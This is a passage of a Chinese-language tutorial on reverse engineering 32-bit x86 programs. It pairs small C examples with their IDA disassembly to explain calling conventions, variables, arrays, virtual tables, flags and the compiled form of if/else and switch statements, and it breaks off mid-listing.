函数程序都是由具有不同功能的函数组成的，因此在逆向分析中将重点放在函数的识别及餐厨的传递上是很有必要的。函数是一个程序模块，用来实现一个特定的功能。 函数的识别首先我们写一个小的Demo： 12345678910111213141516#include &lt;stdio.h&gt;int Add(int x,int y);int main(){ int a=5,b=6; Add(a,b); return 0;}int Add(int x,int y){ return (x+y);} 对应我们给出IDA中反汇编的代码： 12345678910111213141516171819202122232425262728293031323334.text:00401000 var_8 = dword ptr -8.text:00401000 var_4 = dword ptr -4.text:00401000 argc = dword ptr 8.text:00401000 argv = dword ptr 0Ch.text:00401000 envp = dword ptr 10h.text:00401000.text:00401000 push ebp.text:00401001 mov ebp, esp.text:00401003 sub esp, 8 ;抬高栈.text:00401006 mov [ebp+var_4], 5 .text:0040100D mov [ebp+var_8], 6 ;使参数进入栈.text:00401014 mov eax, [ebp+var_8] ;a=5.text:00401017 push eax.text:00401018 mov ecx, [ebp+var_4] ;b=6.text:0040101B push ecx.text:0040101C call sub_40102A ;进入函数内部.text:00401021 add esp, 8 ;恢复栈.text:00401024 xor eax, eax.text:00401026 mov esp, ebp.text:00401028 pop ebp.text:00401029 retn.text:00401029 _main endp.text:0040102A arg_0 = dword ptr 8.text:0040102A arg_4 = dword ptr 0Ch.text:0040102A.text:0040102A push ebp .text:0040102B mov ebp, esp.text:0040102D mov eax, [ebp+arg_0] ;eax中压入6.text:00401030 add eax, [ebp+arg_4] ;[ebp+arg_4]5+6.text:00401033 pop ebp ;恢复栈空间.text:00401034 retn.text:00401034 sub_40102A endp 函数的参数函数传递参数的方式有三种，分别是：”栈传递”、”寄存器方式”、”全局变量隐含参数传递”。 栈传递栈是一种”先进后出”的存储区，栈顶指针esp指向栈中第一个可用的数据项，在调用函数时，调用者依此把参数压入栈，然后调用函数。函数被调用以后，在栈中取得数据并进行计算。函数计算结束以后，由调用者或者函数本身修改栈，使栈恢复原样。 函数调用约定： C规范(即_cdecl)函数的参数从右到左的顺序入栈，由调用者负责清除栈。_cedel是c和c++程序的默认调用约定。 psacal规范按从左到右的顺序参数入栈，要求被调用函数负责清除栈空间。 stdcall调用约定是Win32 API采用的方法，采用C调用约定的入栈顺序和pascal调用约定的调整栈指针方式，即函数入口参数按从右往左的顺序入栈，并由被调用的函数在返回前清理传送参数的内存栈，函数参数的个数固定。由于函数体本身知道传入参数的个数，被调用的函数可以在反汇前使用一个”retn”指令直接清理传递参数的栈。 _cedel类型stdcall类型先把右边的参数压入栈，pascal则相反。在栈平衡上，_cedel类型由调用者用”add esp,0c”指令把12字节的参数空间清除，pascal和stdcall类型则由子程序负责清除。 函数对参数的存取及局部变量都是通过栈来定义的，非优化编译器用一个专门的寄存器对参数进行寻址。 调用者将函数执行完毕时应返回的地址、参数压入栈 子程序使用”ebp指针+偏移量”对栈中的参数进行寻址并取出，完成操作 子程序使用”ret”或”retn”指令返回。此时，CPU将eip置为栈中保存的地址，并且继续执行 例子，按stdcall约定调用函数test2(Pat1,Par2)，其汇编代码如下： 123456789101112131415push par2 ;参数2push par1 ;参数1call test2 ;调用子程序test2( push ebp ;保存现场原来的ebp指针 mov ebp,esp ;设置新的ebp指针，使其指向栈定 mov eax,dword ptr [ebp+0c] ;调用参数2 mov ebx,dword ptr [ebp+08] ;调用参数1 sub esp,8 ;若函数使用局部变量，则要在栈中留出空间 ...... add esp,8 ;释放局部变量占用的栈 pop ebp ;恢复现场的ebp指针 ret 8 ;ret后面的值等于参数的个数乘以4h ) 因为esp是栈指针，所以一般使用ebp来存取栈，其栈建立过程如下： 因此函数中有2个参数，假设执行函数前栈指针的esp为K 根据stdcall调用约定，先将参数par2压入栈，此时esp为k-04h 将参数par1压入栈，此时esp为k-08h 参数入栈后，程序开始执行call指令。call指令把返回地址压入栈，这时esp为k-0ch 现在已经在子程序中，可以使用ebp来存取参数，但是为了在返回时恢复ebp的值，需要执行”push ebp”指令来保存，此时esp为k-10h 执行”mov ebp,esp”指令，ebp被用来在栈中寻找调用者压入的参数，这时[ebp+8]就是参数1，[ebp+c]就是参数2. “sub esp,8”指令表示中定义局部变量。局部变量1和局部变量2对应的地址分别是”[ebp-4]”、”ebp-8”。函数结束的时候，调用”add esp,8”指令释放局部变量占用的栈。局部变量的作用域是定义该变量的函数，也就是说，挡函数调用结束后局部变量就会消失。 调用”ret 8”指令来平衡栈。在ret指令后加一个操作数，表示在ret指令后给栈指针esp加上操作数，完成同样的操作。 指令”enter”和”leave”可以帮助进行栈的维护。enter语句的作用是”push ebp”、”mov ebp,esp”、”sub esp,xxx”，而leave语句则完成”add esp,xxx”、”pop ebp”的功能。 1234enter xxxx,0 ;0表示创建xxxx空间来放置局部变量......leave ;恢复栈ret 8 ;返回 开启VC6里的优化选项为”Maximisz Speed”。其汇编代码如下： 123456789101112push par2 ;参数2push par1 ;参数1call test2 ;调用子程序test2( push ebp ;保存现场原来的ebp指针 mov ebp,esp ;设置新的ebp指针，使其指向栈定 mov eax,dword ptr [ebp+04] ;调用参数2 mov ebx,dword ptr [ebp+08] ;调用参数1 ...... ret 8 ;返回 ) 程序这个时候使用esp来传递参数了。 假设执行函数前栈指针esp为k 根据stdcall调用约定，先将参数Par2压入栈，此时esp为k-04h 将Par1压入栈，此时esp为k-08h 参数入栈以后，程序开始执行call指令。call指令把返回地址压入栈，此时esp为k-0ch 现在程序已经在子程序中了，可以使用esp来存取参数了 寄存器传递参数寄存器传递参数的方式没有标准，但绝大多数都使用Fastcall，顾名思义，特别就是快。 不同的编译器实现得Fastcall稍有不同，VC++编译器采用Fastcall规范传递参数时，左边的2个不大于4字节(DWORD)的参数分别放在ecx和edx寄存器中，寄存器用完就要使用栈，其余剩下的参数按从右往左的顺序压入栈、 1234567891011121314#include &lt;stdio.h&gt;int _fastcall Add(char,long,int ,int );int main(void){ Add(1,2,3,4); return 0;}int _fastcall Add(char a,long b,int c,int d){ return (1,2,3,4);} 相对应汇编代码： 12345678910111213141516171819202122232425262728.text:00401000 push ebp.text:00401001 mov ebp, esp.text:00401003 push 4 ;后两个参数从右往左入栈，先压入4h.text:00401005 push 3 ;将第三个参数压入栈，压入3h.text:00401007 mov edx, 2 ;将第二个参数的值2h放入edx寄存器中.text:0040100C mov cl, 1 ;字符类型的变量，大小为8位，所以用寄存器的高八位.text:0040100E call sub_401017 ;函数调用.text:00401013 xor eax, eax.text:00401015 pop ebp.text:00401016 retn.......text:00401017 var_8 = dword ptr -8.text:00401017 var_4 = byte ptr -4.text:00401017 arg_0 = dword ptr 8.text:00401017 arg_4 = dword ptr 0Ch.text:00401017.text:00401017 push ebp .text:00401018 mov ebp, esp.text:0040101A sub esp, 8 ;为局部变量分配8个字节.text:0040101D mov [ebp+var_8], edx ;将第二个参数放到局部变量[ebp-08]中.text:00401020 mov [ebp+var_4], cl ;将第一个参数放到局部变量[ebp-04]中.text:00401023 movsx eax, [ebp+var_4] ;将字符类型符号扩展为一个双字.text:00401027 add eax, [ebp+var_8] ;将左边两个参数相加.text:0040102A add eax, [ebp+arg_0] ;用eax中的结果加第三个参数.text:0040102D add eax, [ebp+arg_4] ;用eax中的结果加第四个参数.text:00401030 mov esp, ebp.text:00401032 pop ebp.text:00401033 retn 8 thiscall也用到了寄存器传递参数，thiscall是C++中的非静态类成员函数的默认调用约定，对象的每个函数隐含接受this参数。采用thiscall约定时，函数的参数按照从右往左的顺序入栈 ，被调用的函数在返回前清理传送参数的栈，仅通过ecx寄存器传递一个额外的参数，this指针 定义一个类，并在类中顶一个成员函数，代码如下： 12345678910111213141516#include &lt;stdio.h&gt;class CSum{public: int Add(int a, int b) //实际Add原型具有如下形式:Add(this,int a,int b) { return (a + b); }};void main(){ CSum sum; sum.Add(1, 2);} 使用VC++进行编译，汇编代码如下： 12345678910111213141516171819202122232425.text:00401000.text:00401000 push ebp.text:00401001 mov ebp, esp.text:00401003 push ecx.text:00401004 push 2 ;第三个参数.text:00401006 push 1 ;第二个参数.text:00401008 lea ecx, [ebp+var_4] ;this指针通过ecx寄存器传递.text:0040100B call sub_401020 ;sum.Add()函数(1,2).text:00401010 mov esp, ebp.text:00401012 pop ebp.text:00401013 retn.......text:00401020 var_4 = dword ptr -4.text:00401020 arg_0 = dword ptr 8.text:00401020 arg_4 = dword ptr 0Ch.text:00401020.text:00401020 push ebp.text:00401021 mov ebp, esp.text:00401023 push ecx.text:00401024 mov [ebp+var_4], ecx ;第三个参数.text:00401027 mov eax, [ebp+arg_0] ;第二个参数.text:0040102A add eax, [ebp+arg_4] ;第一个参数.text:0040102D mov esp, ebp.text:0040102F pop ebp.text:00401030 retn 8 名称修饰约定为了允许使用操作符和函数重载，C++编译器往往会按照某种规则改写每一个入口点的函数名，从而允许同一个名字(具有不同的参数类型或不同的作用域)有多个用法且不会破坏现有的基于C的链接器。 stdcall调用约定在函数名前面加一个下划线前缀，在后面加一个@符号机器参数的字节数。 _cdecl调用约定仅在输出函数名前加一个下划线前缀。 Fastcall调用约定在前面加一个@符号，在后面加一个@符号机器参数的字节数 它们均不改变输出函数名中的字符大小写。这和pascal调用约定不同。pascal约定输出的函数名不能有任何其他修饰且全部为大写 stdcall调用约定以”?”标识函数名的开始，后跟函数名；在函数名后面，以”@@YG”标识参数表的开始，后跟参数表；参数表的第一项为该函数的返回值类型，其后依次为参数的数据类型，指针标识在其所指数据类型前；在其参数表后面，以”@z”标识整个名字的结束。 _cdecl调用约定规矩与上面的stdcall调用约定规则相同，只是参数表的开始标识由”@@YG”变成了”@@YA” Fastcall调用约定规则与上面的stdcall调用约定规则相同，只是参数表的开始由”@@YG”变成了”@@YI” 函数的返回值函数被调用执行后，将向调用者返回1个或多个执行结果，称为函数返回值。返回值最常见的形式是return操作符，还有通过参数按传引用方式返回值、通过全局变量返回值等。 return返回值在一般情况下，函数的返回值存放在eax寄存器中返回，如果处理结果大小超过eax寄存器的容量，其高32位就会被存放在edx寄存器中 123456789101112131415#include &lt;stdio.h&gt;int Add(int x,int y);main( ){ Add(5,6); return 0; }Add(int x,int y){ int temp; temp=x+y; return temp;} 汇编代码如下： 123456789101112131415161718192021222324.text:00401000 push ebp.text:00401001 mov ebp, esp.text:00401003 push 6 ;从右往左方式调用，第一个参数为6.text:00401005 push 5.text:00401007 call sub_401013 ;调用子程序.text:0040100C add esp, 8.text:0040100F xor eax, eax.text:00401011 pop ebp.text:00401012 retn.......text:00401013 var_4 = dword ptr -4.text:00401013 arg_0 = dword ptr 8.text:00401013 arg_4 = dword ptr 0Ch.text:00401013.text:00401013 push ebp ;保存ebp.text:00401014 mov ebp, esp ;设置新的ebp指针.text:00401016 push ecx ;为局部变量分配内存空间.text:00401017 mov eax, [ebp+arg_0] ;取第一个参数.text:0040101A add eax, [ebp+arg_4] ;相加.text:0040101D mov [ebp+var_4], eax ;将结果存入局部变量中.text:00401020 mov eax, [ebp+var_4] ;将结果存入eax中.text:00401023 mov esp, ebp ;恢复现场.text:00401025 pop ebp ;平衡堆栈.text:00401026 retn ;退出 参数按传引用方式返回给函数传递参数的方法有两种，分别是传引用和传值。进行传递调用的时候，会建立参数的一份副本，并把它传递给调用函数，在调用函数中修改参数值不会影响原始的变量值。传引用调用允许调用函数修改原始变量的值。调用某个函数得时候，当把变量的地址传递给函数时，可以在函数中用间接引用运算符修改调用函数内存单元中该变量得值。 1234567891011121314151617#include &lt;stdio.h&gt;void max(int *a, int *b);main( ){ int a=5,b=6; max(&amp;a, &amp;b); printf(&quot;a、b中较大的数是%d&quot;,a); //将最大的数显示出来 return 0;}void max( int *a, int *b) { if(*a &lt; *b) *a=*b; //经比较后，将较大的数放到a变量之中} 汇编代码如下： 1234567891011121314151617181920212223242526272829303132.text:00401000 var_8 = dword ptr -8.text:00401000 var_4 = dword ptr -4.text:00401000 argc = dword ptr 4.text:00401000 argv = dword ptr 8.text:00401000 envp = dword ptr 0Ch.text:00401000.text:00401000 sub esp, 8 ;为局部变量分配内存.text:00401003 lea eax, [esp+8+var_4] ;eax指向变量，值为k-4h.text:00401007 lea ecx, [esp+8+var_8] ;ecx指向变量，值为k-8h.text:0040100B push eax ;指向参数b的字符指针入栈.text:0040100C push ecx ;指向参数a的字符指针入栈.text:0040100D mov [esp+10h+var_8], 5 ;[esp-8h],将参数a的值放入.text:00401015 mov [esp+10h+var_4], 6 ;[esp-4h],将参数b的值放入.text:0040101D call sub_401040 ;调用子程序.text:00401022 mov edx, [esp+10h+var_8] ;利用变量[esp+08]返回函数值.text:00401026 push edx.text:00401027 push offset unk_407030.text:0040102C call sub_401060.text:00401031 xor eax, eax.text:00401033 add esp, 18h.text:00401036 retn........text:00401040 arg_0 = dword ptr 4.text:00401040 arg_4 = dword ptr 8.text:00401040.text:00401040 mov eax, [esp+arg_4] ;执行后，eax就是指向参数b的指针.text:00401044 mov ecx, [esp+arg_0] ;执行后，，ecx就是指向参数a的指针.text:00401048 mov eax, [eax] ;将参数b的值加载到寄存器eax中.text:0040104A mov edx, [ecx] ;将参数a的值加载到寄存器edx中.text:0040104C cmp edx, eax ;比较edx和eax的大小.text:0040104E jge short locret_401052 ;若a&lt;b，则不跳转.text:00401050 mov [ecx], eax ;将较大的值放到参数a指向的数据区中 数据结构局部变量局部变量是函数内部定义的一个变量，其作用域和生命周期都局限于所在函数内，使用局部变量使程序模块化封装称为可能。 栈存放局部变量局部变量在栈中进行分配，函数执行后释放这些栈。 编译器可能会使用”push reg”指令取代”sub esp,4”指令 例子代码如下： 123456789101112131415161718#include &lt;stdio.h&gt;int add(int x,int y);int main(){ int a=5,b=6; add(a,b); return 0;}int add(int x,int y){ int z; z = x + y; return z;} 汇编代码如下： 1234567891011121314151617181920212223242526272829303132333435.text:00401000 var_8 = dword ptr -8.text:00401000 var_4 = dword ptr -4.text:00401000 argc = dword ptr 8.text:00401000 argv = dword ptr 0Ch.text:00401000 envp = dword ptr 10h.text:00401000 push ebp.text:00401001 mov ebp, esp.text:00401003 sub esp, 8 ;为参数开辟局部变量空间.text:00401006 mov [ebp+var_4], 5 ;将参数1存入局部变量[ebp+04]04代表的值是-4，相当于[ebp-04].text:0040100D mov [ebp+var_8], 6 ;将参数2存入局部变量[ebp-08]中.text:00401014 mov eax, [ebp+var_8].text:00401017 push eax.text:00401018 mov ecx, [ebp+var_4].text:0040101B push ecx.text:0040101C call sub_40102A.text:00401021 add esp, 8.text:00401024 xor eax, eax.text:00401026 mov esp, ebp.text:00401028 pop ebp.text:00401029 retn.......text:0040102A var_4 = dword ptr -4.text:0040102A arg_0 = dword ptr 8.text:0040102A arg_4 = dword ptr 0Ch.text:0040102A.text:0040102A push ebp.text:0040102B mov ebp, esp.text:0040102D push ecx ;给局部变量开辟内存空间.text:0040102E mov eax, [ebp+arg_0] ;取参数1.text:00401031 add eax, [ebp+arg_4].text:00401034 mov [ebp+var_4], eax.text:00401037 mov eax, [ebp+var_4] ;将a+b的值存入eax寄存器中.text:0040103A mov esp, ebp.text:0040103C pop ebp.text:0040103D retn 局部变量的起始值是随机的，是其他函数执行后在栈中的垃圾数据，因此需要对该值进行初始化，初始化局部变量有两种方法；一种是通过mov指令为其变量赋值，另外一个使用push指令直接压值入栈 寄存器存放局部变量除了栈利用了两个寄存器，编译器会利用剩下的6个寄存器尽可能有效的存放局部变量，这样可以少产生代码，提高程序的效率。 全局变量全局变量作用域整个程序，它一直存在，存放在全局变量的内存区中。 在大多数情况下，在汇编代码中识别全局代码比在其他结构中要容易的多。全局变量通常位于数据区块(.data)的一个固定地址处，当程序需要访问全局变量的时候，一般会使用一个固定的硬编码地址直接对内存进行寻址。 1mov eax,dword ptr[4084c0h] ;直接调用全局变量，其中4084c0h是全局变量的地址 全局变量可以被捅一文件的所有函数改变，如果在某个函数中改变了全局变量的值，就能影响其他函数，因此，可以利用全局变量来传递参数和函数返回值等。全局变量在程序的整个可执行过程中占用内存单元，而不像局部变量那样在使用的时候开辟内存空间 C代码如下： 1 汇编代码如下： 123456789101112131415161718192021222324252627282930313233.text:00401000 var_8 = dword ptr -8.text:00401000 var_4 = dword ptr -4.text:00401000 argc = dword ptr 8.text:00401000 argv = dword ptr 0Ch.text:00401000 envp = dword ptr 10h.text:00401000.text:00401000 push ebp.text:00401001 mov ebp, esp.text:00401003 sub esp, 8.text:00401006 mov [ebp+var_4], 5 ;[ebp-04]是局部变量，将参数1放入.text:0040100D mov [ebp+var_8], 6 ;[ebp-08]是局部变量，将参数2放入.text:00401014 mov dword_405428, 7 ;对全局变量[00405428]这个地址进行初始化.text:0040101E mov eax, [ebp+var_8].text:00401021 push eax.text:00401022 mov ecx, [ebp+var_4].text:00401025 push ecx.text:00401026 call sub_401034.text:0040102B add esp, 8.text:0040102E xor eax, eax.text:00401030 mov esp, ebp.text:00401032 pop ebp.text:00401033 retn.......text:00401034 arg_0 = dword ptr 8.text:00401034 arg_4 = dword ptr 0Ch.text:00401034.text:00401034 push ebp.text:00401035 mov ebp, esp.text:00401037 mov eax, [ebp+arg_0] ;[ebp+08]为参数1.text:0040103A add eax, [ebp+arg_4] ;[ebp+04]为参数2.text:0040103D add eax, dword_405428 ;调用了全局变量[00405428].text:00401043 pop ebp.text:00401044 retn 数组数组是相同数据类型元素的集合，它们在内存中按顺序连续存放在一起。 12345678910111213141516171819#include &lt;stdio.h&gt;int main(void){ static int a[3] = {0x11,0x22,0x33}; int i,s=0,b[3]; for(i=0;i&lt;3;i++) { s=s+a[i]; b[i] = s; } for(i=0;i&lt;3;i++) { printf(&quot;%d\\n&quot;,b[i]); } return 0;} 汇编代码如下： 123456789101112131415161718192021222324252627282930313233343536.text:00401000 var_10 = dword ptr -10h.text:00401000 var_C = byte ptr -0Ch.text:00401000 argc = dword ptr 4.text:00401000 argv = dword ptr 8.text:00401000 envp = dword ptr 0Ch.text:00401000.text:00401000 sub esp, 0Ch ;为局部变量分配内存，用来存放b[i].text:00401003 xor ecx, ecx ;s=0.text:00401005 xor eax, eax ;i=0.text:00401007 push esi.text:00401008 push edi.text:00401009.text:00401009 loc_401009: ; CODE XREF: _main+1B\u0019j.text:00401009 mov edi, dword_407030[eax] ;407030指向a[]数组，即数组的基址.text:0040100F add eax, 4 ;访问数组的索引.text:00401012 add ecx, edi ;s=s+a[i].text:00401014 cmp eax, 0Ch.text:00401017 mov [esp+eax+14h+var_10], ecx ;b[i]=s.text:0040101B jl short loc_401009.text:0040101D lea esi, [esp+14h+var_C].text:00401021 mov edi, 3 ;计数器.text:00401026.text:00401026 loc_401026: ; CODE XREF: _main+3A\u0019j.text:00401026 mov eax, [esi] ;esi指向b[]数组.text:00401028 push eax.text:00401029 push offset unk_40703C.text:0040102E call sub_401050 ;printf.text:00401033 add esp, 8.text:00401036 add esi, 4 ;指向数组下一元素.text:00401039 dec edi.text:0040103A jnz short loc_401026.text:0040103C pop edi.text:0040103D xor eax, eax.text:0040103F pop esi.text:00401040 add esp, 0Ch.text:00401043 retn 在内存中，数组可以存在于栈、数据段及动态内存中，其寻址用”基址+偏移量”实现。 12mov eax,[407030h + eax] ;基址 偏移量 虚函数C++的对象模型的核心概念并没有很多，最重要的概念就是虚函数。虚函数是在程序运行时定义的函数。虚函数的地址不能在编译时确定，只能在调用即将进行时确定。所有对虚函数的引用通常放在一个专门的数组–虚函数表中，数组的每个元素中存放的就是类中虚函数的地址。调用虚函数时，程序先取出虚函数表指针，得到虚函数表地址，再根据这个地址到虚函数表中取出该函数的地址，最后调用该函数 123456789101112131415161718192021222324#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;iostream&gt;using namespace std;class CSum{public: virtual int Add(int a, int b) { return (a + b); } virtual int Sub(int a, int b) { return (a - b); }};void main(){ CSum *pSCum = new CSum; pSCum-&gt;Add(1, 2); pSCum-&gt;Sub(1, 2);} 优化后汇编代码如下： 12345678910111213141516171819202122232425262728293031323334353637.text:00401000 argc = dword ptr 4.text:00401000 argv = dword ptr 8.text:00401000 envp = dword ptr 0Ch.text:00401000.text:00401000 push esi.text:00401001 push 4 ; .text:00401003 call ??2@YAPAXI@Z ; new函数，为新建对象分配4字节内存.text:00401008 add esp, 4.text:0040100B test eax, eax.text:0040100D jz short loc_401019.text:0040100F mov dword ptr [eax], offset off_4050A0 ;将4050A0写到创建的对象实例中;4050A0是CSum类虚函数表中的指针;表中的元素是CSum类的虚函数，指向CSum的成员.text:00401015 mov esi, eax ;esi=VTBL ;;用NULL来指向对象实例指针 .text:00401017 jmp short loc_40101B ;在内存分配失败的时候来到该分支，空指针将激活SEH.text:00401019 ; ---------------------------------------------------------------------------.text:00401019.text:00401019 loc_401019: ; CODE XREF: _main+D\u0018j.text:00401019 xor esi, esi ;.text:0040101B.text:0040101B loc_40101B: ; CODE XREF: _main+17\u0018j.text:0040101B mov eax, [esi] ;EAX=*VTBL=**Add().text:0040101D push 2.text:0040101F push 1.text:00401021 mov ecx, esi ;ECX=this.text:00401023 call dword ptr [eax] ;pCSum-&gt;ADd(1,2).text:00401025 mov edx, [esi] ;.text:00401027 push 2.text:00401029 push 1.text:0040102B mov ecx, esi.text:0040102D call dword ptr [edx+4].text:00401030 pop esi.text:00401031 retn 这段代码先调用了NEW函数分配class所需要的内存。调用成功以后，eax保存分配内存的指针，然后将对象实例指向CSum类虚函数表(VTBL)004050A0h。004050A0处的数据如下： VTBL中的两组数据分别在图中做了标识： 00401040 00401050 根据这两个指针的地址去查看内容: 00401040处的汇编代码： 1234567.text:00401040 arg_0 = dword ptr 4.text:00401040 arg_4 = dword ptr 8.text:00401040.text:00401040 mov eax, [esp+arg_4].text:00401044 mov ecx, [esp+arg_0].text:00401048 add eax, ecx.text:0040104A retn 8 00401050处的汇编代码： 1234567.text:00401050 arg_0 = dword ptr 4.text:00401050 arg_4 = dword ptr 8.text:00401050.text:00401050 mov eax, [esp+arg_0].text:00401054 mov ecx, [esp+arg_4].text:00401058 sub eax, ecx.text:0040105A retn 8 虚函数是通过指向虚函数表的指针间接地加以调用 控制语句在高级语言中，用IF-ELSE、WSITCH-CASE等语句来构建判断流程。但是其汇编代码比较复杂，我们会看到需要cmp等指令后加各类跳转指令。 标志寄存器call：调用 jmp：无条件跳转 jo：溢出跳转（OF=1），对应于jno jb：低于/进位跳转（CF=1），对应jnb（bottom） ja：高于跳转，对应jna（tall） jbe：低于等于跳转 jae：高于等于跳转 je/jz：相等跳转（ZF=1），对应jne/jnz js：符号为负跳转（SF=1），对应jns jl：小于跳转，对应jnl（low） jle：小于等于跳转 jg：大于跳转，对应jng（big，great，large） jge：大于等于跳转 nop：不跳转，空指针 ZF 零标志位 flag 的第 6 位是 ZF，零标志位。它记录相关指令执行后，其结果是否为 0，如果结果为 0，那么 zf=1；如果结果不为 0，那么 zf=0。 PF 标志 flag 的第 2 位是 PF，奇偶标志位。它记录相关指令执行后，其结果的所有 bit 位中 1 的个数是否为偶数。如果 1 的个数为偶数，pf=1，如果为奇数，那么 pf=0. SF 标志 flag 的第 7 位是 SF，符号标志位。它记录相关指令执行后，其结果是否为负。如果结果为负数，sf=1；如果非负，sf=0。 CF 标志 flag的第0位是CF，进位标志位。一般情况下，在进行无符号数运算的时候，记录了运算结果的最高有效位向更高位的进位值，或从更高位的借位值。 OF 标志flag的第11位是OF，溢出标志位。一般情况下，OF记录了有符号数运算的结果是否发生了溢出。如果发生溢出，OF=1；如果没有，OF=0. 一定要注意CF和OF的区别：CF是对无符号运算有意义的标志位，而OF是对有符号运算有意义的标志位。 DF标志 flag的第10位是DF，方向标志位。在串处理指令中，控制每次操作后si、di的增减。 df=0 每次操作后si、di递增 df=1 每次操作后si、di递减 IF-THEL-ELSE语句将语句IF-THEN-ELSE编译成后边代码后，整数用cmp指令进行比较，浮点用fcom、fcomp等指令进行比较。 12cmp a,bjz(jnz) xxx cmp指令不会修改操作书。两个操作书之间的结果会影响处理的几个标志。 实际中，很多编译器会使用test或者or之列的较短的逻辑来替换cmp指令 实例代码： 123456789101112#include &lt;stdio.h&gt;int main(void){ int a,b=5; printf(&quot;请输入数字:&quot;); scanf(&quot;%d&quot;,&amp;a); if(a==0) { a=8; } return a + b;} 汇编代码如下： 12345678910111213141516171819202122.text:00401000 var_4 = dword ptr -4.text:00401000 argc = dword ptr 4.text:00401000 argv = dword ptr 8.text:00401000 envp = dword ptr 0Ch.text:00401000.text:00401000 push ecx ;为局部变量分配内存空间.text:00401001 push offset aIFI ; &quot;请输入.text:00401006 call _printf ;指向printf函数.text:0040100B lea eax, [esp+8+var_4] ;eax指向局部变量.text:0040100F push eax ;将eax压入栈.text:00401010 push offset aD ; &quot;%d&quot;.text:00401015 call _scanf ;scanf输入函数u.text:0040101A mov eax, [esp+10h+var_4] ;局部变量存入eax寄存器中.text:0040101E add esp, 0Ch ;函数调用，平衡栈.text:00401021 test eax, eax ;若eax寄存器为0，则ZF为1，否则ZF为0.text:00401023 jnz short loc_40102A ;若ZF=1就不跳转，否则跳转.text:00401025 mov eax, 8.text:0040102A.text:0040102A loc_40102A: ; CODE XREF: _main+23\u0018j.text:0040102A add eax, 5 .text:0040102D pop ecx ;释放局部变量使用的内存.text:0040102E retn SWITCH-CASE语句代码如下： 123456789101112131415161718#include &lt;stdio.h&gt;int main(void){ int a; scanf(&quot;%d&quot;,&amp;a); switch(a) { case 1 : printf(&quot;a=1&quot;); break; case 2 : printf(&quot;a=2&quot;); break; case 10 : printf(&quot;a=10&quot;); break; default : printf(&quot;default&quot;); break; }} 不优化的代码如下： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556.text:00401000 var_8 = dword ptr -8.text:00401000 var_4 = dword ptr -4.text:00401000 argc = dword ptr 8.text:00401000 argv = dword ptr 0Ch.text:00401000 envp = dword ptr 10h.text:00401000.text:00401000 push ebp .text:00401001 mov ebp, esp.text:00401003 sub esp, 8 ;;为局部变量分配内存.text:00401006 lea eax, [ebp+var_4].text:00401009 push eax.text:0040100A push offset aD ; &quot;%d&quot;.text:0040100F call _scanf ;scanf(%d,&amp;a).text:00401014 add esp, 8.text:00401017 mov ecx, [ebp+var_4] ;将输入结果传递给ecx.text:0040101A mov [ebp+var_8], ecx.text:0040101D cmp [ebp+var_8], 1 ;case 1.text:00401021 jz short loc_401031.text:00401023 cmp [ebp+var_8], 2 ;case 2.text:00401027 jz short loc_401040.text:00401029 cmp [ebp+var_8], 0Ah ;case 10.text:0040102D jz short loc_40104F.text:0040102F jmp short loc_40105E ;default.text:00401031 ; ---------------------------------------------------------------------------.text:00401031.text:00401031 loc_401031: ; CODE XREF: _main+21\u0018j.text:00401031 push offset aA1 ; &quot;a=1&quot;.text:00401036 call _printf.text:0040103B add esp, 4.text:0040103E jmp short loc_40106B.text:00401040 ; ---------------------------------------------------------------------------.text:00401040.text:00401040 loc_401040: ; CODE XREF: _main+27\u0018j.text:00401040 push offset aA2 ; &quot;a=2&quot;.text:00401045 call _printf.text:0040104A add esp, 4.text:0040104D jmp short loc_40106B.text:0040104F ; ---------------------------------------------------------------------------.text:0040104F.text:0040104F loc_40104F: ; CODE XREF: _main+2D\u0018j.text:0040104F push offset aA10 ; &quot;a=10&quot;.text:00401054 call _printf.text:00401059 add esp, 4.text:0040105C jmp short loc_40106B.text:0040105E ; ---------------------------------------------------------------------------.text:0040105E.text:0040105E loc_40105E: ; CODE XREF: _main+2F\u0018j.text:0040105E push offset aDefault ; &quot;default&quot;.text:00401063 call _printf.text:00401068 add esp, 4.text:0040106B.text:0040106B loc_40106B: ; CODE XREF: _main+3E\u0018j.text:0040106B ; _main+4D\u0018j ....text:0040106B mov esp, ebp.text:0040106D pop ebp.text:0040106E retn 开启优化选项后的汇编代码 123456789101112131415161718192021222324252627282930313233343536373839404142.text:00401000 push ecx.text:00401001 lea eax, [esp+4+var_4].text:00401005 push eax.text:00401006 push offset aD ; &quot;%d&quot;.text:0040100B call _scanf.text:00401010 mov eax, [esp+0Ch+var_4] ;将scanf的结果存入ax中.text:00401014 add esp, 8 ;给局部变量开辟空间.text:00401017 dec eax ;检查eax是否为1h，如果是，jz跳转.text:00401018 jz short loc_40104F ;case 1.text:0040101A dec eax ;将eax的值减1，即eax原值为2.text:0040101B jz short loc_401040 ;case2.text:0040101D sub eax, 8 ;eax两次减1的值为8h，所以原值为10h.text:00401020 jz short loc_401031 ;case10.text:00401022 push offset aDefault ; &quot;default&quot;.text:00401027 call _printf.text:0040102C add esp, 4.text:0040102F pop ecx.text:00401030 retn.text:00401031 ; ---------------------------------------------------------------------------.text:00401031.text:00401031 loc_401031: ; CODE XREF: _main+20\u0018j.text:00401031 push offset aA10 ; &quot;a=10&quot;.text:00401036 call _printf.text:0040103B add esp, 4.text:0040103E pop ecx.text:0040103F retn.text:00401040 ; ---------------------------------------------------------------------------.text:00401040.text:00401040 loc_401040: ; CODE XREF: _main+1B\u0018j.text:00401040 push offset aA2 ; &quot;a=2&quot;.text:00401045 call _printf.text:0040104A add esp, 4.text:0040104D pop ecx.text:0040104E retn.text:0040104F ; ---------------------------------------------------------------------------.text:0040104F.text:0040104F loc_40104F: ; CODE XREF: _main+18\u0018j.text:0040104F push offset aA1 ; &quot;a=1&quot;.text:00401054 call _printf.text:00401059 add esp, 4.text:0040105C pop ecx.text:0040105D retn 如果case的取值表示一个算术级数，那么编译器就会利用一个跳转表来实现。 我们多写一些case语句 12345678910111213141516171819202122232425262728293031#include &lt;stdio.h&gt;int main(void) { int a; scanf(&quot;%d&quot;,&amp;a); switch(a) { case 1 :printf(&quot;a=1&quot;); break; case 2 :printf(&quot;a=2&quot;); break; case 3:printf(&quot;a=3&quot;); break; case 4:printf(&quot;a=4&quot;); break; case 5:printf(&quot;a=5&quot;); break; case 6:printf(&quot;a=6&quot;); break; case 7:printf(&quot;a=7&quot;); break; default :printf(&quot;a=default&quot;); break; } return 0; } 汇编代码如下： 123456789101112131415161718192021.text:00401000 var_4 = dword ptr -4.text:00401000 argc = 